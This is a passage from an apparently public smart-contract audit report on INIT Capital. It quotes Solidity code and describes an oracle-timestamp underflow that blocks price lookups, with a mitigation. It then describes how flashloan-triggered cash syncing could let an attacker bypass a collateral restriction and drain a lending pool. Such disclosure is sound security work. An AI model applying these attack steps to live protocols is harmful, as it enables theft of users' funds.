{</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// load and check</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">DataFeedInfo</span><span class=\"mtk1\"> </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">dataFeedInfos</span><span class=\"mtk1\">[</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">dataFeedId</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">bytes32</span><span class=\"mtk1\">(</span><span class=\"mtk7\">0</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">DATAFEED_ID_NOT_SET</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxStaleTime</span><span class=\"mtk1\"> != </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAX_STALETIME_NOT_SET</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// get price and token&#39;s decimals</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">uint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">IERC20Metadata</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_token</span><span class=\"mtk1\">).</span><span class=\"mtk11\">decimals</span><span class=\"mtk1\">());</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// return price per token with 1e18 precisions</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// e.g. 1 BTC = 35000 * 1e18 in USD_e18 unit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">int224</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IApi3ServerV1</span><span class=\"mtk1\">(</span><span class=\"mtk12\">api3ServerV1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">readDataFeedWithId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">dataFeedId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check if the last updated is not longer than the max stale time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxStaleTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAX_STALETIME_EXCEEDED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// return as [USD_e36 per wei unit]</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">price_e36</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">price</span><span class=\"mtk1\">.</span><span class=\"mtk11\">toUint256</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">ONE_E18</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk12\">decimals</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Note the check:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"24\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// e.g. 1 BTC = 35000 * 1e18 in USD_e18 unit</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">(</span><span class=\"mtk12\">int224</span><span class=\"mtk1\"> </span><span class=\"mtk12\">price</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) = </span><span class=\"mtk11\">IApi3ServerV1</span><span class=\"mtk1\">(</span><span class=\"mtk12\">api3ServerV1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">readDataFeedWithId</span><span class=\"mtk1\">(</span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">dataFeedId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// check if the last updated is not longer than the max stale time</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxStaleTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAX_STALETIME_EXCEEDED</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>If timestamp is greater than block.timestamp, the transaction will revert and block oracle lookup on APi3OracleReader.sol.</p>\n<p>The relayer on api3 side can update both oracle price timestamp and value.</p>\n<p>Let us go over how the price is updated in Api3 code:</p>\n<p>The function readDataFeedWithID basically just read the data from struct _dataFeeds[beaconId], <a href=\"https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L75\">in this function</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"25\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @notice Reads the data feed with ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @param dataFeedId Data feed ID</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @return value Data feed value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @return timestamp Data feed timestamp</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">_readDataFeedWithId</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dataFeedId</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> </span><span class=\"mtk11\">view</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int224</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">DataFeed</span><span class=\"mtk1\"> </span><span class=\"mtk12\">storage</span><span class=\"mtk1\"> </span><span class=\"mtk12\">dataFeed</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">_dataFeeds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">dataFeedId</span><span class=\"mtk1\">];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        (</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) = (</span><span class=\"mtk12\">dataFeed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">, </span><span class=\"mtk12\">dataFeed</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk7\">0</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;Data feed not initialized&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>When the relayer updates the oracle data, first we are calling <a href=\"https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/BeaconUpdatesWithSignedData.sol#L41\">processBeaconUpdate</a>.</p>\n<p>Note that is a <a href=\"https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L115\">modifier onlyValidateTimestamp</a>.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"26\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">processBeaconUpdate</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes32</span><span class=\"mtk1\"> </span><span class=\"mtk12\">beaconId</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">bytes</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> </span><span class=\"mtk12\">data</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">internal</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">onlyValidTimestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">int224</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updatedBeaconValue</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">updatedBeaconValue</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">decodeFulfillmentData</span><span class=\"mtk1\">(</span><span class=\"mtk12\">data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">_dataFeeds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">beaconId</span><span class=\"mtk1\">].</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;Does not update timestamp&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_dataFeeds</span><span class=\"mtk1\">[</span><span class=\"mtk12\">beaconId</span><span class=\"mtk1\">] = </span><span class=\"mtk11\">DataFeed</span><span class=\"mtk1\">({</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">updatedBeaconValue</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">timestamp:</span><span class=\"mtk1\"> </span><span class=\"mtk11\">uint32</span><span class=\"mtk1\">(</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>The <a href=\"https://github.com/api3dao/airnode-protocol-v1/blob/fa95f043ce4b50e843e407b96f7ae3edcf899c32/contracts/api3-server-v1/DataFeedServer.sol#L30\">check</a> ensures that only when the timstamp is from more than 1 hour, the update reverts.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"27\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk3\">/// @dev Reverts if the timestamp is from more than 1 hour in the future</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">modifier</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyValidTimestamp</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">) </span><span class=\"mtk12\">virtual</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">unchecked</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hours</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk8\">&quot;Timestamp not valid&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>What does this mean?</p>\n<p>The timestamp of an oracle can be set to the future within an hour, the relayer does not have to be malicious, it is a normal part of updating data.</p>\n<p>Suppose the current timestamp is 10000</p>\n<p>1 hour = 3600 seconds</p>\n<p>If the relayer set timestamp to 12000, the price update will go through</p>\n<p>But the code:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"28\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> &lt;= </span><span class=\"mtk12\">dataFeedInfo</span><span class=\"mtk1\">.</span><span class=\"mtk12\">maxStaleTime</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">MAX_STALETIME_EXCEEDED</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Will revert when current timestamp is 10001.</p>\n<p>10001 - 12000 will revert in underflow.</p>\n<h3 id=\"recommended-mitigation-steps-13\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-13\" aria-label=\"recommended mitigation steps 13 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>If the oracle timestamp comes from the future, the code should consider it not stale.</p>\n<p>Can change the code to:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"29\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (block.timestamp &gt; timestamp) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"> _require(block.timestamp - timestamp &lt;= dataFeedInfo.maxStaleTime, Errors.MAX_STALETIME_EXCEEDED);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/4#issuecomment-1869777419\">fez-init (INIT) confirmed</a></strong></p>\n<hr>\n<h2 id=\"m-12-admin-configuration-isallowedforcollateralmode-pool-can-be-bypassed-by-donating-asset-to-the-pool-directly-and-then-trigger-sync-cash-via-flashloan\" style=\"position:relative;\"><a href=\"#m-12-admin-configuration-isallowedforcollateralmode-pool-can-be-bypassed-by-donating-asset-to-the-pool-directly-and-then-trigger-sync-cash-via-flashloan\" aria-label=\"m 12 admin configuration isallowedforcollateralmode pool can be bypassed by donating asset to the pool directly and then trigger sync cash via flashloan permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/3\">[M-12] Admin configuration isAllowedForCollateral(mode, pool) can be bypassed by donating asset to the pool directly and then trigger sync cash via flashloan</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/3\">ladboy233</a>, also found by <a href=\"https://github.com/code-423n4/2023-12-initcapital-findings/issues/16\">rvierdiiev</a></em></p>\n<p>In the current implementation, after user deposits funds into lending pool and mint lending pool shares, user can call collateralize function to add collateral:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"30\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">collateralize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyAuthorized</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">) </span><span class=\"mtk11\">nonReentrant</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IConfig</span><span class=\"mtk1\"> </span><span class=\"mtk12\">_config</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IConfig</span><span class=\"mtk1\">(</span><span class=\"mtk12\">config</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check mode status</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint16</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mode</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">_getPosMode</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getModeStatus</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">).</span><span class=\"mtk12\">canCollateralize</span><span class=\"mtk1\">, </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">COLLATERALIZE_PAUSED</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// check if the position mode supports _pool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// update collateral on the position</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amtColl</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IPosManager</span><span class=\"mtk1\">(</span><span class=\"mtk12\">POS_MANAGER</span><span class=\"mtk1\">).</span><span class=\"mtk11\">addCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Collateralize</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_posId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">, </span><span class=\"mtk12\">amtColl</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>There is a validation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"31\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span><span class=\"mtk11\">_require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_config</span><span class=\"mtk1\">.</span><span class=\"mtk11\">isAllowedForCollateral</span><span class=\"mtk1\">(</span><span class=\"mtk12\">mode</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_pool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">Errors</span><span class=\"mtk1\">.</span><span class=\"mtk12\">INVALID_MODE</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>Let us consider the case:</p>\n<p>The mode supports three pools, USDC lending pool, WETH lending pool and a token A lending pool.</p>\n<p>The token A is subject to high volatility, the admin decides to disalllow token A lending pool added as collateral.</p>\n<p>But then the token A is hacked.</p>\n<p>The attacker can mint the token A infinitely.</p>\n<p>There is a relevant hack in the past:</p>\n<ol>\n<li><a href=\"https://ciphertrace.com/infinite-minting-exploit-nets-attacker-4-4m/\">https://ciphertrace.com/infinite-minting-exploit-nets-attacker-4-4m/</a></li>\n</ol>\n<p>Attacker exploited logical and math error to mint token infinitely.</p>\n<ol start=\"2\">\n<li><a href=\"https://www.coindesk.com/business/2022/10/10/binance-exec-bnb-smart-chain-hack-could-have-been-worse-if-validators-hadnt-sprung-into-action/\">https://www.coindesk.com/business/2022/10/10/binance-exec-bnb-smart-chain-hack-could-have-been-worse-if-validators-hadnt-sprung-into-action/</a></li>\n</ol>\n<p>Attacker exploited cryptographical logic to mint token infinitely.</p>\n<p>But even when admin disallow a mode from further collaterize or disallow the lending pool from further collaterize, the hacker can donate the token to the lending pool and inflate the share worth to borrow all fund out.</p>\n<ol>\n<li>hacker transfers the infinitely minted token to the lending pool</li>\n<li>then hacker can call the <a href=\"https://github.com/code-423n4/2023-12-initcapital/blob/a53e401529451b208095b3af11862984d0b32177/contracts/core/InitCore.sol#L383\">function flash</a></li>\n</ol>\n<p>This would trigger the function syncCash, which update the cash amount in the lending pool to make sure the donated token count into the token worth</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"32\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// execute callback</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">IFlashReceiver</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">).</span><span class=\"mtk11\">flashCallback</span><span class=\"mtk1\">(</span><span class=\"mtk12\">_pools</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_amts</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fees</span><span class=\"mtk1\">, </span><span class=\"mtk12\">_data</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// sync cash</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint</span><span 